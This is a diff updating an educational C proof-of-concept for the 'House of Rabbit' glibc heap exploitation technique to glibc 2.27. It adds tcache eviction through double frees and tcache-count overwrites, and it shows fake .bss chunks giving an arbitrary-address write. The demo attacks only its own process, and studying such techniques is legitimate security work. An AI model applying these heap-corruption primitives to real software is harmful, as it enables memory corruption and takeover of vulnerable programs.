@@ -5,23 +5,38 @@
    Yutaro Shimizu
    @shift_crops
    2017/09/14
+
+   Update (2019/08/06) : Ubuntu 18.04 (glibc-2.27)
 */
+
+// gcc house_of_rabbit.c -D GLIBC_VERSION=27 -o house_of_rabbit
 
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
-char target[0x10] = "Hello, World!";
-unsigned long gbuf[6] = {0};
+void evict_tcache(size_t size);
+
+char target[0x30] = "Hello, World!";
+unsigned long gbuf[8] = {0};
 
 int main(void){
 	void *p, *fast, *small, *fake;
 	char *victim;
 
+	setbuf(stdin, NULL);
+	setbuf(stdout, NULL);
+
 	printf(	"This is PoC of House of Rabbit\n"
 		"This technique bypassing Heap ASLR without leaking address, "
 		"and make it possible to overwrite a variable located at an arbitary address.\n"
 		"Jump like a rabbit and get an accurate address by malloc! :)\n\n");
+
+	// 0. Disable tcache for 0x20,0x90 chunks
+	printf("0. Disable tcache for 0x20,0x90 chunks (for glibc version >= 2.26)\n\n");
+	evict_tcache(0x18);
+	evict_tcache(0x88);
+
 
 	// 1. Make 'av->system_mem > 0xa00000'
 	printf("1. Make 'av->system_mem > 0xa00000'\n");
@@ -37,8 +52,8 @@ int main(void){
 
 	// 2. Free fast chunk and link to fastbins
 	printf("2. Free fast chunk and link to fastbins\n");
-	fast = malloc(0x10); 		// any size in fastbins is ok 
-	small = malloc(0x80);
+	fast = malloc(0x18);
+	small = malloc(0x88);
 	printf(	"  Allocate fast chunk and small chunk.\n"
 		"  fast = %p\n"
 		"  small = %p\n", fast, small);
@@ -48,8 +63,10 @@ int main(void){
 	
 	// 3. Make fake_chunk on .bss
 	printf("3. Make fake_chunk on .bss\n");
-	gbuf[1] = 0x11;	
-	gbuf[3] = 0xfffffffffffffff1;	
+	gbuf[0] = 0xfffffffffffffff0;
+	gbuf[1] = 0x10;
+	gbuf[3] = 0x21;
+	gbuf[7] = 0x1;
 	printf(	"  fake_chunk1 (size : 0x%lx) is at %p\n"
 		"  fake_chunk2 (size : 0x%lx) is at %p\n\n"
 		, gbuf[3], &gbuf[2], gbuf[1], &gbuf[0]);
@@ -95,4 +112,32 @@ int main(void){
 	strcpy(victim, "Hacked!!");
 
 	printf("  After  : %s\n", target);
+}
+
+void evict_tcache(size_t size){
+	void *p;
+
+#if defined(GLIBC_VERSION) && (GLIBC_VERSION >= 26)
+	p = malloc(size);
+
+#if	(GLIBC_VERSION < 29)
+	free(p);
+	free(p);
+	malloc(size);
+	malloc(size);
+
+	*(void**)p = NULL;
+
+	malloc(size);
+#else
+
+#if (GLIBC_VERSION == 29)
+	char *counts 		= (char*)(((unsigned long)p & ~0xfff) + 0x10);
+#else
+	uint16_t *counts 	= (char*)(((unsigned long)p & ~0xfff) + 0x10);
+#endif
+	counts[(size + 0x10 >> 4) - 2] = 0xff;
+
+#endif
+#endif
 }
